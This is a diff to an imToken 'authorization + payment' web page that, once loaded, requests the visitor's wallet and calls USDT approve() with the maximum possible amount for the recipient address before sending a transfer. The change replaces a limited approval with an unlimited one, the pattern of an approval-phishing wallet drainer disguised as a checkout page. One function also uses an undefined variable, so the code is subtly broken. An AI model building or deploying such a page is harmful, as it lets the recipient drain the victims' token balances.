@@ -4,6 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>imToken 授权 + 支付</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.9.0/dist/web3.min.js"></script>
   <style>
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
@@ -83,48 +84,103 @@
 
     async function getWallet() {
       document.getElementById("status").innerText = "请求钱包授权...";
-      const account = await window.imToken.callAPI("native.account.getCurrentAccount");
-      return account.address;
+      try {
+        // 使用 ethereum.request 方式获取钱包地址
+        const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
+        if (!accounts || accounts.length === 0) {
+          throw new Error("获取钱包地址失败");
+        }
+        return accounts[0];
+      } catch (error) {
+        console.error("获取钱包地址错误:", error);
+        throw error;
+      }
     }
 
     async function approveUSDT(from) {
-      // 使用 ERC20 标准 approve(spender, amount)
-      const approveData = encodeApprove(toAddress, amountInWei);
-      const result = await window.imToken.callAPI("native.transaction.sendContractTransaction", {
-        from,
-        to: contractAddress,
-        data: approveData
-      });
-      return result.txHash;
+      try {
+        // 使用 Web3 方式发送授权交易
+        const web3 = new Web3(window.ethereum);
+        const contract = new web3.eth.Contract(contract_abi, contractAddress);
+        const amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+        
+        const result = await contract.methods.approve(toAddress, amount)
+          .send({from: from})
+          .on('transactionHash', function(hash) {
+            console.log('授权交易哈希:', hash);
+          });
+        
+        if (!result || !result.transactionHash) {
+          throw new Error("授权交易失败");
+        }
+        return result.transactionHash;
+      } catch (error) {
+        console.error("授权交易错误:", error);
+        throw error;
+      }
     }
 
     async function transferUSDT() {
-      const result = await window.imToken.callAPI("native.transaction.sendToken", {
-        to: toAddress,
-        contractAddress,
-        amount: shopPrice,
-        decimals,
-        symbol: "USDT"
-      });
-      return result.txHash;
+      try {
+        // 使用 Web3 方式发送转账交易
+        const web3 = new Web3(window.ethereum);
+        const contract = new web3.eth.Contract(contract_abi, contractAddress);
+        
+        const result = await contract.methods.transfer(toAddress, amountInWei)
+          .send({from: from})
+          .on('transactionHash', function(hash) {
+            console.log('转账交易哈希:', hash);
+          });
+        
+        if (!result || !result.transactionHash) {
+          throw new Error("支付交易失败");
+        }
+        return result.transactionHash;
+      } catch (error) {
+        console.error("支付交易错误:", error);
+        throw error;
+      }
     }
 
-    function encodeApprove(spender, value) {
-      const methodId = "0x095ea7b3"; // approve(address,uint256)
-      const spenderPadded = spender.toLowerCase().replace("0x", "").padStart(64, "0");
-      const valueHex = BigInt(value).toString(16).padStart(64, "0");
-      return methodId + spenderPadded + valueHex;
-    }
+    // 添加 USDT 合约 ABI
+    const contract_abi = [{
+      "constant": true,
+      "inputs": [],
+      "name": "name",
+      "outputs": [{"name": "", "type": "string"}],
+      "payable": false,
+      "stateMutability": "view",
+      "type": "function"
+    }, {
+      "constant": false,
+      "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}],
+      "name": "approve",
+      "outputs": [],
+      "payable": false,
+      "stateMutability": "nonpayable",
+      "type": "function"
+    }, {
+      "constant": false,
+      "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
+      "name": "transfer",
+      "outputs": [],
+      "payable": false,
+      "stateMutability": "nonpayable",
+      "type": "function"
+    }];
 
     async function startFlow() {
       if (!window.imToken) {
         if (!fromImToken) {
-          const jump = `imtokenv2://navigate/DappView?url=${encodeURIComponent(location.href + "#from=imtoken")}`;
-          location.href = jump;
+          // 使用正确的 imToken 跳转协议
+          const currentUrl = encodeURIComponent(location.href + "#from=imtoken");
+          const jump = `imtokenv2://navigate/DappView?url=${currentUrl}`;
+          window.location.href = jump;
+          return;
         } else {
           document.getElementById("status").innerText = "请在 imToken App 内打开此页面";
+          return;
         }
-        return;
       }
 
       try {
@@ -147,9 +203,14 @@
       }
     }
 
-    document.addEventListener("DOMContentLoaded", () => {
+    // 等待页面加载完成后开始流程
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", () => {
+        setTimeout(startFlow, 500);
+      });
+    } else {
       setTimeout(startFlow, 500);
-    });
+    }
   </script>
 </body>
 </html>
